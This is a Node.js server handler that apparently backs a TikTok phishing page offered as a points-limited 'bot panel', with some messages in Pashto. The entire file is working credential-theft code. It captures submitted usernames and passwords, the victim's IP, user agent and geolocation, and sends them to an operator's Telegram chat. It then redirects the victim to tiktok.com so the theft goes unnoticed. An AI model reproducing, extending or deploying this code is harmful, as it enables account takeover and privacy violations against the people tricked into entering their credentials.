const fetch = require('node-fetch');
const { Telegraf } = require('telegraf');
const { Redis } = require('@upstash/redis');

const bot = new Telegraf(process.env.BOT_TOKEN);

// Redis setup
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL,
  token: process.env.UPSTASH_REDIS_REST_TOKEN,
});

module.exports = async (req, res) => {
  if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

  const { username, password, uid } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Kabul' });

  // ✅ Step 1: Check points
  let points = await redis.get(uid);
  if (!points) {
    points = 5;
    await redis.set(uid, 5);
  }

  if (parseInt(points) <= 0) {
    await bot.telegram.sendMessage(uid, "❌ ستاسو امتیازونه خلاص شوي دي.");
    return res.status(403).send("❌ No more points");
  }

  // 🌍 Step 2: Geo info
  let geo = {};
  try {
    geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
  } catch (e) {
    geo = {};
  }

  // ✉️ Step 3: Compose TikTok message
  const message = `
╭───🎵 𝗧𝗶𝗸𝗧𝗼𝗸 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗗𝗮𝘁𝗮 ✅ ────────╮
├ 👤 Username: ${username}
├ 🔐 Password: ${password}
├ 🆔 ID: ${uid}
├ ⏰ Time: ${timestamp}
├ 🌐 IP: ${ip}
├ 🏙️ City: ${geo.city || 'Unknown'}
├ 🌍 Country: ${geo.country || 'Afghanistan'}
├ 🛰️ ISP: ${geo.isp || 'Unknown'}
├ 📱 Device: ${userAgent}
╰──────────────────────────────╯

🎯 معلومات په بریالیتوب سره ترلاسه شول.

╭───── 🔥 TikTok Bot Panel ─────╮
│ 🛠️ Developed By: @WACIQ
╰──────────────────────────────╯
`;

  try {
    await bot.telegram.sendMessage(uid, message);

    await redis.decr(uid); // -1 point

    return res.redirect('https://tiktok.com'); // TikTok ته redirect
  } catch (e) {
    console.error("Telegram Error:", e.message);
    return res.status(500).send("❌ Failed to send message.");
  }
}; 
